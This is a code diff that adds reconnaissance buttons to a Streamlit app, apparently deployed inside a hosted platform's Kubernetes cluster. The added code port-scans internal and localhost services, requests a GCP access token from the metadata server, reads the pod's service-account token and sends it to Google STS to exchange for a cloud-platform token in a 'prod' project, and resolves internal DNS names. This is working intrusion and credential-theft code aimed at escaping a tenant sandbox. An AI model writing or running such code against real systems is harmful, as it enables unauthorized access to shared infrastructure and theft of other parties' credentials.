@@ -135,3 +135,79 @@ if st.sidebar.button("K8s API Test"):
             
     except Exception as e:
         st.sidebar.error(f"K8s Error: {str(e)[:200]}")
+
+# Test 8: Internal network scanning — find other services
+if st.sidebar.button("Network Scan"):
+    import socket
+    results = []
+    # Common internal service ports on typical GKE clusters
+    targets = [
+        ("10.0.0.1", 443, "K8s API via cluster IP"),
+        ("10.0.0.1", 8443, "K8s API alt"),
+        ("10.0.0.10", 53, "KubeDNS"),
+        ("127.0.0.1", 8501, "Streamlit self"),
+        ("127.0.0.1", 8080, "Local proxy"),
+        ("127.0.0.1", 9090, "Prometheus"),
+        ("127.0.0.1", 6379, "Redis"),
+        ("127.0.0.1", 5432, "Postgres"),
+        ("metadata.google.internal", 80, "GCP metadata HTTP"),
+    ]
+    for host, port, desc in targets:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            result = s.connect_ex((host, port))
+            status = "OPEN" if result == 0 else "CLOSED"
+            s.close()
+            if result == 0:
+                st.sidebar.success(f"{desc} ({host}:{port}): {status}")
+            else:
+                st.sidebar.info(f"{desc} ({host}:{port}): {status}")
+        except Exception as e:
+            st.sidebar.warning(f"{desc}: {str(e)[:50]}")
+
+# Test 9: GCP API access via workload identity
+if st.sidebar.button("GCP APIs"):
+    try:
+        # Try to get GCP access token via metadata (even though metadata is blocked,
+        # workload identity might provide tokens through a different mechanism)
+        r = requests.get("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+                        headers={"Metadata-Flavor": "Google"}, timeout=3)
+        st.sidebar.write(f"GCP token: {r.status_code} - {r.text[:200]}")
+    except Exception as e:
+        st.sidebar.warning(f"Metadata blocked: {str(e)[:80]}")
+    
+    # Try GCP APIs directly with the K8s token (workload identity federation)
+    try:
+        token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
+        # Exchange K8s token for GCP access token
+        r = requests.post("https://sts.googleapis.com/v1/token", json={
+            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+            "audience": "//iam.googleapis.com/projects/s4a-prod/locations/global/workloadIdentityPools/default/providers/default",
+            "scope": "https://www.googleapis.com/auth/cloud-platform",
+            "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
+            "subject_token": token,
+            "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"
+        }, timeout=5)
+        st.sidebar.write(f"STS exchange: {r.status_code} - {r.text[:200]}")
+    except Exception as e:
+        st.sidebar.warning(f"STS: {str(e)[:80]}")
+
+# Test 10: DNS resolution — find internal services
+if st.sidebar.button("DNS Recon"):
+    import socket
+    domains = [
+        "kubernetes.default.svc",
+        "kubernetes.default.svc.cluster.local",
+        "streamlit-service.default.svc.cluster.local",
+        "redis.default.svc.cluster.local",
+        "postgres.default.svc.cluster.local",
+        "api.default.svc.cluster.local",
+        "internal.streamlit.io",
+    ]
+    for d in domains:
+        try:
+            ip = socket.gethostbyname(d)
+            st.sidebar.success(f"{d} → {ip}")
+        except:
+            st.sidebar.info(f"{d} → not found")
